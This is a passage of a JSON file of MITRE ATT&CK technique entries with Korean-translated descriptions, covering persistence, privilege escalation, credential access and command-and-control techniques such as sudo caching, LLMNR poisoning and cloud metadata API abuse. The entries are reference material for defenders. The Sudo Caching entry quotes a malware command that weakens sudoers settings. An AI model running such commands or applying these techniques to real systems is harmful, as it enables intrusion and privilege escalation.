    "modified": "2021-04-15T03:48:37.628Z",
    "translated": true
  },
  {
    "title": "Stored Data Manipulation",
    "description": "적대자는 외부 결과를 조작하거나 활동을 숨기기 위해 정지된 데이터에 삽입, 삭제 또는 조작을 수행할 수 있습니다. 저장된 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려 할 수 있습니다. \n\n저장된 데이터는 Office 파일, 데이터베이스, 저장된 이메일 및 맞춤형 파일 형식과 같은 다양한 파일 형식을 포함할 수 있습니다. 수정의 종류와 그로 인한 영향은 데이터의 유형과 적대자의 목표에 따라 다릅니다. 복잡한 시스템의 경우, 적대자는 해당 시스템과 관련된 특수 소프트웨어에 대한 접근이 필요할 수 있으며, 이는 일반적으로 장기간의 정보 수집 캠페인을 통해 얻어질 수 있습니다.",
    "external_id": "T1492",
    "modified": "2020-03-02T14:24:26.780Z",
    "translated": true
  },
  {
    "title": "File System Permissions Weakness",
    "description": "프로세스는 기능의 일환으로 특정 이진 파일을 자동으로 실행하거나 다른 작업을 수행할 수 있습니다. 대상 이진 파일이 포함된 파일 시스템 디렉토리의 권한이나 이진 파일 자체의 권한이 잘못 설정되어 있다면, 대상 이진 파일은 사용자 수준 권한을 사용하여 다른 이진 파일로 덮어쓰여질 수 있으며 원본 프로세스에 의해 실행될 수 있습니다. 원본 프로세스와 스레드가 더 높은 권한 수준에서 실행되고 있다면, 교체된 이진 파일 또한 높은 권한 수준에서 실행될 수 있으며, 여기에는 SYSTEM 권한도 포함될 수 있습니다.\n\n공격자는 이 기법을 사용하여 합법적인 이진 파일을 악의적인 이진 파일로 교체하여 더 높은 권한 수준에서 코드를 실행하는 수단으로 활용할 수 있습니다. 실행 중인 프로세스가 특정 시간에 실행되거나 특정 이벤트(예: 시스템 부팅) 중에 실행되도록 설정되어 있다면, 이 기법은 지속성을 위해서도 사용될 수 있습니다.\n\n### 서비스\n\n윈도우 서비스 이진 파일 조작은 이 기법의 한 변형입니다. 공격자는 합법적인 서비스 실행 파일을 자신의 실행 파일로 교체하여 지속성 및/또는 서비스가 실행되도록 설정된 계정 컨텍스트(로컬/도메인 계정, SYSTEM, LocalService 또는 NetworkService)에 대한 권한 상승을 얻을 수 있습니다. 서비스가 시작되면, 사용자가 직접(적절한 접근 권한이 있는 경우) 또는 서비스가 부팅 시 시작되는 경우 시스템 재시작과 같은 다른 수단을 통해, 교체된 실행 파일이 원래의 서비스 실행 파일 대신 실행됩니다.\n\n### 실행 설치 프로그램\n\n이 기법의 또 다른 변형은 실행 가능한 자동 압축 해제 설치 프로그램에서 일반적으로 발생하는 취약점을 이용하여 수행할 수 있습니다. 설치 과정에서 설치 프로그램은 종종 이진 파일(DLL, EXE 또는 기타 페이로드)을 압축 해제하기 위해 <code>%TEMP%</code> 디렉토리 내의 하위 디렉토리를 사용합니다. 설치 프로그램이 하위 디렉토리 및 파일을 생성할 때, 종종 쓰기 권한을 제한하기 위한 적절한 권한을 설정하지 않아, 하위 디렉토리에 배치된 신뢰할 수 없는 코드의 실행이나 설치 과정에서 사용되는 이진 파일의 덮어쓰기를 할 수 있습니다. 이러한 동작은 DLL 검색 순서 탈취와 관련이 있으며 이를 이용할 수 있습니다. 일부 설치 프로그램은 또한 상승된 권한을 요구할 수 있으며, 이는 공격자가 제어하는 코드를 실행할 때 권한 상승을 초래합니다. 이러한 동작은 사용자 계정 컨트롤 우회를 관련이 있습니다. 여러 일반 설치 프로그램의 권한 상승 취약성 사례가 소프트웨어 공급업체에 보고되었습니다.",
    "external_id": "T1044",
    "modified": "2020-03-19T15:11:39.627Z",
    "translated": true
  },
  {
    "title": "LLMNR/NBT-NS Poisoning and Relay",
    "description": "링크-로컬 멀티캐스트 이름 해상도(LLMNR)와 넷바이오스 이름 서비스(NBT-NS)는 호스트 식별을 위한 대체 방법으로 작용하는 마이크로소프트 윈도우 구성 요소입니다. LLMNR은 도메인 이름 시스템(DNS) 형식을 기반으로 하며, 동일한 로컬 링크에 있는 호스트가 다른 호스트에 대한 이름 해상도를 수행할 수 있도록 합니다. NBT-NS는 로컬 네트워크에서 넷바이오스 이름으로 시스템을 식별합니다. \n\n적대자는 희생자의 네트워크에서 LLMNR(UDP 5355)/NBT-NS(UDP 137) 트래픽에 대해 요청된 호스트의 신원을 아는 것처럼 응답함으로써 이름 해상도의 권위 있는 출처를 스푸핑할 수 있습니다. 이로 인해 서비스가 오염되어 희생자가 적대자가 컨트롤하는 시스템과 통신하도록 만들 수 있습니다. 요청된 호스트가 식별/인증을 요구하는 리소스에 속하는 경우, 사용자 이름과 NTLMv2 해시가 적대자가 컨트롤하는 시스템으로 전송됩니다. 이후 적대자는 포트를 모니터링하여 전송된 해시 정보를 수집하거나 오프라인에서 해시를 크랙하여 평문 비밀번호를 확보할 수 있습니다. 경우에 따라 적대자가 시스템 간 인증 경로에 있는 시스템에 접근할 수 있는 경우나 자격 증명을 사용하는 자동 스캔이 적대자가 컨트롤하는 시스템에 인증을 시도할 때 NTLMv2 해시를 가로채고 이를 전달하여 타겟 시스템에서 코드를 실행할 수 있습니다. 전달 단계는 오염과 함께 발생할 수 있지만 독립적으로도 발생할 수 있습니다.\n\nNBNSpoof, Metasploit 등의 여러 도구가 로컬 네트워크 내에서 이름 서비스를 오염시키는 데 사용될 수 있습니다.",
    "external_id": "T1171",
    "modified": "2020-02-11T19:09:48.452Z",
    "translated": true
  },
  {
    "title": "DNS",
    "description": "적대자는 목표를 설정하는 과정에서 사용할 수 있는 피해자의 DNS에 대한 정보를 수집할 수 있습니다. DNS 정보에는 등록된 이름 서버, 목표의 서브도메인, 메일 서버 및 기타 호스트에 대한 주소 지침을 포함하여 다양한 세부 사항이 포함될 수 있습니다. DNS MX, TXT 및 SPF 레코드는 Office 365, G Suite, Salesforce 또는 Zendesk와 같은 타사 클라우드 및 SaaS 제공업체의 사용을 나타낼 수도 있습니다.\n\n적대자는 DNS/수동 DNS와 같은 방법으로 이 정보를 수집할 수 있습니다. DNS 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수도 있습니다. 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 마련하거나 초기 접근을 설정하는 데 도움이 될 수 있습니다.\n\n또한, 적대자는 잘못 구성된 DNS 서버로부터 모든 레코드를 수집하기 위해 DNS 존 전송(DNS 쿼리 유형 AXFR)을 사용할 수도 있습니다.",
    "external_id": "T1590.002",
    "modified": "2024-11-11T16:13:02.196Z",
    "translated": true
  },
  {
    "title": "Systemd Service",
    "description": "Systemd 서비스는 Linux 시스템에서 지속성을 설정하는 데 사용할 수 있습니다. systemd 서비스 관리자는 일반적으로 백그라운드 데몬 프로세스(서비스로도 알려짐) 및 기타 시스템 리소스를 관리하는 데 사용됩니다. systemd는 Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15와 같은 많은 Linux 배포판에서 기본 초기화 시스템(init 시스템)으로 사용되며, SysVinit 및 Upstart와 같은 기존 init 시스템을 대체하면서 이러한 init 시스템과의 호환성을 유지합니다.\n\nSystemd는 서비스가 어떻게 부팅되고 어떤 조건에서 작동하는지를 제어하기 위해 서비스 유닛이라고 하는 구성 파일을 사용합니다. 기본적으로 이러한 유닛 파일은 `/etc/systemd/system` 및 `/usr/lib/systemd/system` 디렉토리에 저장되며, 파일 확장자는 `.service`입니다. 각 서비스 유닛 파일은 시스템 명령을 실행할 수 있는 여러 지시어를 포함할 수 있습니다.\n\n* ExecStart, ExecStartPre, ExecStartPost 지시어는 서비스가 'systemctl'에 의해 수동으로 시작될 때 또는 서비스가 자동으로 시작되도록 설정된 경우 시스템 시작 시 명령을 실행하는 것을 다룹니다.\n* ExecReload 지시어는 서비스가 재시작될 때를 다룹니다.\n* ExecStop 및 ExecStopPost 지시어는 서비스가 중지될 때 또는 'systemctl'에 의해 수동으로 중지될 때를 다룹니다.\n\n공격자들은 시스템이 부팅될 때와 같은 주기적으로 악성 명령을 실행하도록 systemd가 작동하게 하는 서비스 유닛 파일을 생성하거나 수정함으로써 피해 시스템에 대한 지속적인 접근을 설정하는 systemd 기능을 사용해왔습니다.\n\n공격자들은 일반적으로 `/etc/systemd/system` 및 `/usr/lib/systemd/system` 디렉토리에서 서비스 유닛 파일을 생성하거나 수정하기 위해 루트 권한이 필요하지만, 낮은 권한의 사용자들은 `~/.config/systemd/user/`와 같은 디렉토리에서 서비스 유닛 파일을 생성하거나 수정하여 사용자 수준의 지속성을 달성할 수 있습니다.",
    "external_id": "T1501",
    "modified": "2020-01-17T16:51:52.027Z",
    "translated": true
  },
  {
    "title": "Elevated Execution with Prompt",
    "description": "적대자는 AuthorizationExecuteWithPrivileges API를 이용해 사용자에게 자격 증명을 요청하여 권한 상승을 할 수 있습니다. 이 API의 목적은 애플리케이션 개발자가 애플리케이션 설치 또는 업데이트와 같은 작업을 루트 권한으로 쉽게 수행할 수 있도록 하는 것입니다. 이 API는 루트 권한을 요청하는 프로그램이 신뢰할 수 있는 출처에서 온 것인지 또는 악의적으로 수정된 것인지 검증하지 않습니다. 이 API는 더 이상 사용되지 않지만 최신 버전의 macOS에서도 여전히 완전히 작동합니다. 이 API를 호출할 때 사용자에게 자격 증명을 입력하라는 메시지가 표시되지만 프로그램의 출처나 무결성에 대한 검사는 이루어지지 않습니다. API를 호출하는 프로그램은 또한 수정되어 악의적인 행동을 수행할 수 있는 쓰기 가능 파일을 로드할 수 있습니다.\n\n적대자는 AuthorizationExecuteWithPrivileges를 남용하여 루트 권한을 획득하고 희생자에게 악성 소프트웨어를 설치하며 지속적 메커니즘을 설치할 수 있습니다. 이 기술은 사용자가 악성 코드에 상승된 권한을 부여하도록 속이기 위해 위장 기술과 결합될 수 있습니다. 이 기술은 또한 이 API를 사용하는 기계에 존재하는 합법적인 프로그램을 수정하여 작동할 수 있는 것으로 나타났습니다.",
    "external_id": "T1514",
    "modified": "2020-02-05T20:13:51.857Z",
    "translated": true
  },
  {
    "title": "Component Firmware",
    "description": "일부 적대자는 컴퓨터 구성 요소를 손상시키고 운영 체제 및 기본 시스템 펌웨어 또는 BIOS 외부에서 적대자 코드를 실행하는 악성 펌웨어를 설치하기 위해 정교한 수단을 사용할 수 있습니다. 이 기술은 시스템 펌웨어와 유사할 수 있지만, 동일한 기능이나 무결성 검사 수준이 없을 수 있는 다른 시스템 구성 요소에 대해 수행됩니다. 악성 장치 펌웨어는 시스템에 대한 지속적인 접근을 제공할 수 있으며, 일반적인 접근 유지 실패 및 하드 디스크 재설정에도 불구하고 이를 극복할 수 있는 방법을 제공할 수 있습니다. 또한, 호스트 소프트웨어 기반 방어 및 무결성 검사를 회피할 수 있는 수단이 될 수 있습니다.",
    "external_id": "T1109",
    "modified": "2020-10-23T15:04:14.614Z",
    "translated": true
  },
  {
    "title": "Timestomp",
    "description": "적대자는 새로운 파일의 배포를 숨기거나 기존 파일을 수정하여 활동을 감추기 위한 행동을 취할 수 있습니다. 타임스텀핑은 파일의 타임스탬프(수정, 접근, 생성 및 변경 시간을) 변경하는 기술로, 종종 같은 폴더에 있는 파일을 모방하기 위해 사용됩니다. 이는 예를 들어 적대자가 수정하거나 생성한 파일에 대해 수행되어, 디지털 포렌식 조사자나 파일 분석 도구에 눈에 띄지 않게 하기 위해 나타납니다. 타임스텀핑은 파일 이름을 위장하는 것과 함께 사용되어 맬웨어와 도구를 숨기는 데 활용될 수 있습니다.",
    "external_id": "T1099",
    "modified": "2020-02-18T16:56:57.039Z",
    "translated": true
  },
  {
    "title": "Rc.common",
    "description": "부팅 과정에서 macOS는 다양한 유틸리티 기능을 포함한 셸 스크립트인 <code>source /etc/rc.common</code>를 실행합니다. 이 파일은 명령줄 인수 처리 및 시스템 설정 수집을 위한 루틴도 정의하고 있어, 스타트업 항목 스크립트의 시작 부분에 포함하는 것이 권장됩니다. macOS와 OS X에서 이는 런치 에이전트와 런치 데몬을 선호하는 경향으로 인해 더 이상 사용되지 않는 기술이지만, 현재도 여전히 사용되고 있습니다.\n\n적대 세력은 rc.common 파일을 루트 사용자로서 매 재부팅 시 실행될 지속성 코드를 숨기는 방법으로 사용할 수 있습니다.",
    "external_id": "T1163",
    "modified": "2020-01-15T16:27:32.362Z",
    "translated": true
  },
  {
    "title": "DNS Server",
    "description": "적대 세력은 목표 설정 중에 사용할 수 있는 자신의 도메인 네임 시스템(DNS) 서버를 설정할 수 있습니다. 침해 후 활동 중에 적대 세력은 다양한 작업을 위해 DNS 트래픽을 활용할 수 있으며, 이에는 명령 및 제어가 포함됩니다. 기존 DNS 서버를 해킹하는 대신, 적대 세력은 자신의 DNS 서버를 구성하고 운영하는 것을 선택할 수 있습니다.\n\n자신의 DNS 서버를 운영함으로써, 적대 세력은 서버 측 DNS C2 트래픽을 관리하는 방법에 대한 더 많은 통제를 가질 수 있습니다. DNS 서버에 대한 통제가 있으면, 적대 세력은 DNS 응용 프로그램을 구성하여 멀웨어에 대해 조건부 응답을 제공할 수 있으며, 일반적으로 DNS 기반 C2 채널의 구조에 대한 더 많은 유연성을 가질 수 있습니다.",
    "external_id": "T1583.002",
    "modified": "2021-04-15T02:49:49.702Z",
    "translated": true
  },
  {
    "title": "Code Signing",
    "description": "코드 서명은 개발자로부터 이진 파일의 진정성 수준을 제공하고 이진 파일이 변조되지 않았음을 보장합니다. 그러나 적대자는 코드 서명 인증서를 악성 소프트웨어와 도구를 합법적인 이진 파일로 가장하는 데 사용하는 것으로 알려져 있습니다. 운영 중에 사용되는 인증서는 적대자에 의해 생성되거나 위조되거나 도난당할 수 있습니다.\n\n소프트웨어를 처음 실행할 때 확인하기 위한 코드 서명은 최신 Windows 및 macOS/OS X 시스템에서 사용될 수 있습니다. 플랫폼의 분산된 특성으로 인해 Linux에서는 사용되지 않습니다.\n\n코드 서명 인증서는 시스템에서 실행하기 위해 서명된 코드가 필요하다는 보안 정책을 우회하는 데 사용될 수 있습니다.",
    "external_id": "T1116",
    "modified": "2020-02-05T18:59:28.671Z",
    "translated": true
  },
  {
    "title": "Cloud Instance Metadata API",
    "description": "적대자들은 클라우드 인스턴스 메타데이터 API에 접근하여 자격 증명 및 기타 민감한 데이터를 수집하려고 할 수 있습니다.\n\n대부분의 클라우드 서비스 제공업체는 실행 중인 가상 인스턴스에 제공되는 서비스인 클라우드 인스턴스 메타데이터 API를 지원합니다. 이 API는 애플리케이션이 실행 중인 가상 인스턴스에 대한 정보를 접근할 수 있게 해줍니다. 제공되는 정보는 일반적으로 이름, 보안 그룹 및 자격 증명과 추가 비밀을 포함할 수 있는 UserData 스크립트와 같은 민감한 데이터를 포함한 추가 메타데이터를 포함합니다. 인스턴스 메타데이터 API는 애플리케이션 관리에 도움이 되도록 편리하게 제공되며, 인스턴스에 접근할 수 있는 모든 사람이 접근할 수 있습니다.\n\n적대자가 실행 중인 가상 인스턴스에 존재하는 경우, 그들은 인스턴스 메타데이터 API를 직접 쿼리하여 추가 리소스에 대한 접근 권한을 부여하는 자격 증명을 식별할 수 있습니다. 또한 공격자는 공개 웹 프록시에서 서버 측 요청 위조(SSRF) 취약점을 악용하여 공격자가 인스턴스 메타데이터 API에 대한 요청을 통해 민감한 정보에 접근할 수 있도록 할 수 있습니다.\n\n클라우드 서비스 제공업체 간의 사실상 표준은 인스턴스 메타데이터 API를 <code>http[:]//169.254.169.254</code>에서 호스팅하는 것입니다.",
    "external_id": "T1522",
    "modified": "2021-03-08T10:33:01.542Z",
    "translated": true
  },
  {
    "title": "Process Hollowing",
    "description": "프로세스 홀로잉은 프로세스가 일시 중지 상태로 생성된 후 그 메모리가 언맵되고 악성 코드로 대체될 때 발생합니다. 프로세스 인젝션과 유사하게, 악성 코드의 실행은 합법적인 프로세스 아래에 숨겨져 방어 및 탐지 분석을 피할 수 있습니다.",
    "external_id": "T1093",
    "modified": "2020-11-10T18:29:30.437Z",
    "translated": true
  },
  {
    "title": "Domain Fronting",
    "description": "도메인 프론팅은 여러 도메인을 호스팅하는 콘텐츠 전송 네트워크(CDN) 및 기타 서비스의 라우팅 방식을 이용하여 HTTPS 트래픽 또는 HTTPS를 통해 터널링된 트래픽의 의도된 목적지를 숨기는 기술입니다. 이 기술은 TLS 헤더의 SNI 필드와 HTTP 헤더의 Host 필드에 서로 다른 도메인 이름을 사용하는 방식을 포함합니다. 두 도메인이 동일한 CDN에서 제공되는 경우, CDN은 TLS 헤더를 해제한 후 HTTP 헤더에 지정된 주소로 라우팅할 수 있습니다. 이 기술의 변형인 \"도메인 없는\" 프론팅은 SNI 필드를 비워두며; 이 경우 CDN이 SNI와 HTTP Host 필드의 일치를 검증하려고 할 때도 작동할 수 있습니다(비어 있는 SNI 필드를 무시할 경우).\n\n예를 들어, domain-x와 domain-y가 동일한 CDN의 고객이라면, TLS 헤더에 domain-x를 넣고 HTTP 헤더에 domain-y를 넣는 것이 가능합니다. 트래픽은 domain-x로 가는 것처럼 보이지만, CDN은 이를 domain-y로 라우팅할 수 있습니다.",
    "external_id": "T1172",
    "modified": "2020-03-14T23:29:54.083Z",
    "translated": true
  },
  {
    "title": "Digital Certificates",
    "description": "적대자는 타겟팅 중 사용할 수 있는 자체 서명된 SSL/TLS 인증서를 생성할 수 있습니다. SSL/TLS 인증서는 신뢰를 주기 위해 설계되었습니다. 이 인증서에는 키에 대한 정보, 소유자의 신원 정보, 그리고 인증서의 내용이 올바른지 확인한 주체의 디지털 서명이 포함되어 있습니다. 서명이 유효하고, 인증서를 검토하는 사람이 서명자를 신뢰한다면, 그들은 해당 키를 소유자와의 통신에 사용할 수 있다는 것을 알 수 있습니다. 자체 서명된 경우, 디지털 인증서는 제3자 인증 기관(CA)의 서명과 관련된 신뢰 요소가 결여됩니다.\n\n적대자는 C2 트래픽을 암호화하거나 신뢰의 루트에 추가할 경우 중간자 공격을 가능하게 하는 등의 작업을 수행하기 위해 자체 서명된 SSL/TLS 인증서를 생성할 수 있습니다.\n\n디지털 인증서를 생성한 후, 적대자는 그 인증서를 자신이 제어하는 인프라에 설치할 수 있습니다.",
    "external_id": "T1587.003",
    "modified": "2021-10-16T17:32:34.604Z",
    "translated": true
  },
  {
    "title": "SID-History Injection",
    "description": "Windows 보안 식별자(SID)는 사용자 또는 그룹 계정을 식별하는 고유한 값입니다. SID는 보안 설명자와 액세스 토큰 모두에서 Windows 보안에 의해 사용됩니다. 계정은 SID-History Active Directory 속성에 추가 SID를 보유할 수 있어 도메인 간 상호 운용 가능한 계정 마이그레이션을 허용합니다. (예: SID-History의 모든 값은 액세스 토큰에 포함됩니다.)\n\n적대자는 이 메커니즘을 권한 상승에 사용할 수 있습니다. 도메인 관리자(또는 동등한) 권한을 가진 경우, 수집되거나 잘 알려진 SID 값을 SID-History에 삽입하여 임의의 사용자/그룹(예: 엔터프라이즈 관리자)을 가장할 수 있습니다. 이 조작은 로컬 리소스에 대한 접근 권한 상승 및/또는 측면 이동 기술을 통해 일반적으로 접근할 수 없는 도메인에 대한 접근을 초래할 수 있습니다.",
    "external_id": "T1178",
    "modified": "2020-02-18T18:35:21.493Z",
    "translated": true
  },
  {
    "title": "Port Monitors",
    "description": "포트 모니터는 시작 시 로드될 DLL을 설정하기 위해 API 호출을 통해 설정할 수 있습니다. 이 DLL은 C:\\Windows\\System32에 위치할 수 있으며, 부팅 시 인쇄 스풀러 서비스(spoolsv.exe)에 의해 로드됩니다. spoolsv.exe 프로세스는 SYSTEM 레벨 권한으로 실행됩니다. 대안으로, 권한이 허용되면 해당 DLL에 대한 완전한 경로 이름을 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors에 작성하여 임의의 DLL을 로드할 수 있습니다.\n\n레지스트리 키에는 다음 항목에 대한 입력이 포함됩니다:\n\n* 로컬 포트\n* 표준 TCP/IP 포트\n* USB 모니터\n* WSD 포트\n\n적대자는 이 기술을 사용하여 시스템 재부팅 시 지속적으로 실행되고 SYSTEM 권한으로 실행되는 악성 코드를 시작 시 로드할 수 있습니다.",
    "external_id": "T1013",
    "modified": "2020-01-24T19:47:55.183Z",
    "translated": true
  },
  {
    "title": "Spearphishing Link",
    "description": "링크를 이용한 스피어 피싱은 스피어 피싱의 특정 변형입니다. 이는 이메일에 악성 파일을 첨부하는 대신 이메일에 포함된 맬웨어를 다운로드하기 위해 링크를 사용하는 점에서 다른 형태의 스피어 피싱과 다릅니다. 이는 이메일 첨부 파일을 검사할 수 있는 방어를 피하기 위함입니다.\n\n모든 형태의 스피어 피싱은 특정 개인, 회사 또는 산업을 겨냥한 전자적으로 전달되는 사회 공학입니다. 이 경우 악성 이메일은 링크를 포함하고 있습니다. 일반적으로 이 링크는 사회 공학적 텍스트와 함께 제공되며, 사용자가 URL을 브라우저에 클릭하거나 복사하여 붙여넣도록 요구합니다. 방문한 웹사이트는 익스플로잇을 사용하여 웹 브라우저를 손상시킬 수 있거나, 사용자가 애플리케이션, 문서, 압축 파일 또는 실행 파일을 다운로드하라는 메시지를 받을 수 있습니다. 또한 공격자는 이메일과 직접 상호작용하도록 설계된 링크를 포함하기도 하며, 이는 최종 시스템을 직접 공격하거나 이메일 수신을 확인하기 위한 임베디드 이미지를 포함할 수 있습니다. 링크는 사용자를 악성 애플리케이션으로 유도하여 보호된 애플리케이션과 정보에 접근하기 위한 애플리케이션 액세스 토큰을 훔치는 데 사용될 수 있습니다.",
    "external_id": "T1192",
    "modified": "2020-03-02T19:21:35.153Z",
    "translated": true
  },
  {
    "title": "Regsvcs/Regasm",
    "description": "Regsvcs와 Regasm은 .NET 컴포넌트 오브젝트 모델(COM) 어셈블리를 등록하는 데 사용되는 Windows 명령줄 유틸리티입니다. 두 유틸리티 모두 Microsoft에 의해 디지털 서명이 되어 있습니다.\n\n공격자는 Regsvcs와 Regasm을 사용하여 신뢰할 수 있는 Windows 유틸리티를 통해 코드 실행을 프록시할 수 있습니다. 두 유틸리티는 각각 등록 또는 등록 해제 이전에 실행되어야 하는 코드를 지정하기 위해 바이너리 내의 속성을 사용하여 프로세스 화이트리스트를 우회하는 데 사용될 수 있습니다: [ComRegisterFunction] 또는 [ComUnregisterFunction]. 등록 및 등록 해제 속성이 있는 코드는 프로세스가 권한이 충분하지 않거나 실행에 실패하더라도 실행됩니다.",
    "external_id": "T1121",
    "modified": "2020-01-31T19:00:30.734Z",
    "translated": true
  },
  {
    "title": "Sudo Caching",
    "description": "<code>sudo</code> 명령은 \"시스템 관리자가 특정 사용자(또는 사용자 그룹)에게 루트 또는 다른 사용자로서 일부(또는 모든) 명령을 실행할 수 있는 권한을 위임하고 명령과 해당 인수의 감사 기록을 제공할 수 있도록 허용하는\" 기능을 제공합니다. sudo는 시스템 관리자를 위해 만들어졌기 때문에 유용한 구성 기능들이 있습니다. 예를 들어 <code>timestamp_timeout</code>은 <code>sudo</code>가 다시 비밀번호를 요청하기 전에 발생하는 <code>sudo</code>의 인스턴스 간의 시간 간격을 분으로 나타냅니다. 이는 <code>sudo</code>가 일정 기간 동안 자격 증명을 캐시할 수 있기 때문입니다. Sudo는 마지막으로 <code>sudo</code>가 실행된 시간을 타임스탬프와 함께 <code>/var/db/sudo</code>에 파일을 생성(또는 터치)하여 이 타임아웃을 결정합니다. 추가로, 새로운 tty(터미널 세션)를 각각 독립적으로 처리하는 <code>tty_tickets</code> 변수가 있습니다. 이는 예를 들어 하나의 tty의 sudo 타임아웃이 다른 tty에 영향을 미치지 않음을 의미합니다(다시 비밀번호를 입력해야 합니다).\n\n상대방은 이를 악용하여 사용자의 비밀번호 없이 권한을 상승시킬 수 있습니다. <code>/var/db/sudo</code>의 타임스탬프를 모니터링하여 <code>timestamp_timeout</code> 범위 내에 있는지를 확인할 수 있습니다. 만약 그렇다면, 악성 코드는 사용자의 비밀번호를 제공할 필요 없이 sudo 명령을 실행할 수 있게 됩니다. <code>tty_tickets</code>가 비활성화된 경우, 상대방은 그 사용자의 어떤 tty에서든지 이를 수행할 수 있습니다.\n\nOSX Proton 악성 코드는 <code>tty_tickets</code>를 비활성화하여 <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>를 발행함으로써 스크립팅을 쉽게 만들려 하고 있습니다. 이 변경 사항이 반영되기 위해 Proton 악성 코드는 <code>killall Terminal</code>도 발행해야 합니다. macOS Sierra 버전부터는 sudoers 파일이 기본적으로 <code>tty_tickets</code>를 활성화하고 있습니다.",
    "external_id": "T1206",
    "modified": "2020-02-05T20:10:18.586Z",
    "translated": true
  },
  {
    "title": "Security Software Discovery",
    "description": "적대자는 시스템에 설치된 보안 소프트웨어, 구성, 방어 도구 및 센서의 목록을 얻기 위해 시도할 수 있습니다. 여기에는 로컬 방화벽 규칙 및 안티바이러스와 같은 것이 포함될 수 있습니다. 적대자는 자동화된 검색 중에 보안 소프트웨어 발견에서 정보를 사용하여 후속 행동을 형성할 수 있으며, 여기에는 적대자가 대상 시스템을 완전히 감염시키는지 여부와 특정 작업을 시도하는지가 포함됩니다.\n\n### Windows\n\n보안 소프트웨어 정보를 얻기 위해 사용할 수 있는 명령어로는 <code>netsh</code>, <code>reg query</code>와 <code>dir</code>, 그리고 <code>Tasklist</code> 등이 있으며, 그러나 검색 행동의 다른 지표는 적대자가 찾고 있는 소프트웨어나 보안 시스템의 유형에 따라 더 구체적일 수 있습니다.\n\n### Mac\n\nmacOS 맬웨어가 LittleSnitch와 KnockKnock 소프트웨어를 검사하는 것이 점점 더 일반해지고 있습니다.",
    "external_id": "T1063",
    "modified": "2020-02-21T21:17:03.347Z",
    "translated": true
  },
  {
    "title": "Securityd Memory",
    "description": "엘 캐피탄 이전의 OS X에서 루트 접근 권한이 있는 사용자는 로그인한 사용자의 평문 키체인 비밀번호를 읽을 수 있습니다. 이는 애플의 키체인 구현이 사용자가 비밀번호를 반복적으로 입력하라는 요청을 받지 않도록 이러한 자격 증명을 캐시하도록 허용하기 때문입니다. 애플의 securityd 유틸리티는 사용자의 로그인 비밀번호를 받아 이를 PBKDF2로 암호화하고 이 마스터 키를 메모리에 저장합니다. 애플은 또한 사용자의 비밀번호를 암호화하기 위해 일련의 키와 알고리즘을 사용하지만, 마스터 키가 발견되면 공격자는 최종 비밀번호를 해독하기 위해 다른 값을 반복적으로 시도하기만 하면 됩니다.\n\n적대자가 루트 접근 권한을 얻을 수 있다면 (이로 인해 securityd의 메모리를 읽을 수 있음), 그들은 메모리를 통해 올바른 키 시퀀스를 찾기 위해 상대적으로 적은 시도로 사용자의 로그인 키체인을 복호화할 수 있습니다. 이렇게 되면 적대자는 사용자, WiFi, 메일, 브라우저, 인증서, 안전한 메모 등 모든 평문 비밀번호를 얻게 됩니다.",
    "external_id": "T1167",
    "modified": "2020-02-12T18:56:59.153Z",
    "translated": true
  },
  {
    "title": "Social Media Accounts",
    "description": "적대자는 타겟팅 중 사용될 수 있는 소셜 미디어 계정을 타락시킬 수 있습니다. 소셜 엔지니어링을 포함하는 작전에서는 온라인 페르소나의 활용이 중요할 수 있습니다. 적대자가 기존의 소셜 미디어 계정을 타락시키는 대신 소셜 미디어 프로필을 새로 생성하고 관리하는 대신 사용할 수 있습니다. 기존 페르소나를 활용하면, 피해자가 타락된 페르소나와의 관계나 지식을 갖고 있을 경우 신뢰를 형성할 수 있습니다.\n\n소셜 미디어 계정을 타락시키기 위한 다양한 방법이 존재하는데, 예를 들어 정보를 수집하기 위해 자격 증명을 피싱하거나, 제3자 사이트에서 자격 증명을 구매하거나, 자격 증명을 무차별 대입하는 등의 방법이 있습니다. 소셜 미디어 계정을 타락시키기 전에, 적대자는 어떤 계정을 타락시킬지를 결정하기 위해 정찰 작업을 수행할 수 있습니다.\n\n페르소나는 단일 사이트에 존재할 수도 있고 여러 사이트에 걸쳐 존재할 수도 있습니다. 타락된 소셜 미디어 계정은 추가 개발이 필요할 수 있으며, 이는 프로필 정보를 추가하거나 수정하거나, 사회적 네트워크를 추가로 개발하거나, 사진을 포함하는 것을 포함할 수 있습니다.\n\n적대자는 타락된 소셜 미디어 프로필을 사용하여 새로운 연결을 생성하거나 기존의 관심 대상을 유괴할 수 있습니다. 이러한 연결은 직접적일 수도 있고, 다른 사람을 통해 연결을 시도할 수도 있습니다. 타락된 프로필은 초기 접근과 같은 적대자의 생애 주기의 다른 단계 동안 활용될 수 있습니다.",
    "external_id": "T1586.001",
    "modified": "2021-10-16T17:15:12.169Z",
    "translated": true
  },
  {
    "title": "Application Access Token",
    "description": "적대자는 애플리케이션 접근 토큰을 사용하여 일반적인 인증 프로세스를 우회하고 원격 시스템에서 제한된 계정, 정보 또는 서비스에 접근할 수 있습니다. 이러한 토큰은 일반적으로 사용자에게서 도난당하며 로그인 자격 증명의 대신 사용됩니다.\n\n애플리케이션 접근 토큰은 사용자를 대신하여 승인된 API 요청을 수행하는 데 사용되며, 클라우드 기반 애플리케이션 및 소프트웨어 서비스(SaaS)에서 자원에 접근하는 방법으로 일반적으로 사용됩니다. OAuth는 사용자에게 시스템 접근을 위해 토큰을 발급하는 일반적으로 구현된 프레임워크 중 하나입니다. 이러한 프레임워크는 사용자를 검증하고 사용자가 수행할 수 있는 작업을 결정하기 위해 협력적으로 사용됩니다. 신원이 확립되면 토큰을 통해 사용자의 실제 자격 증명을 전달하지 않고도 작업을 승인할 수 있습니다. 따라서 토큰이 유출되면 적대자가 악의적인 애플리케이션을 통해 다른 사이트의 자원에 접근할 수 있게 됩니다.\n\n예를 들어, 클라우드 기반 이메일 서비스에서 악의적인 애플리케이션에 OAuth 접근 토큰이 부여되면 \"리프레시\" 토큰이 수여될 경우 사용자의 계정의 기능에 장기적으로 접근할 수 있는 가능성이 있습니다. OAuth 접근 토큰을 사용하여 적대자는 사용자 승인 REST API를 통해 이메일 검색 및 연락처 열거와 같은 기능을 수행할 수 있습니다.\n\n유출된 접근 토큰은 다른 서비스 손상에 대한 초기 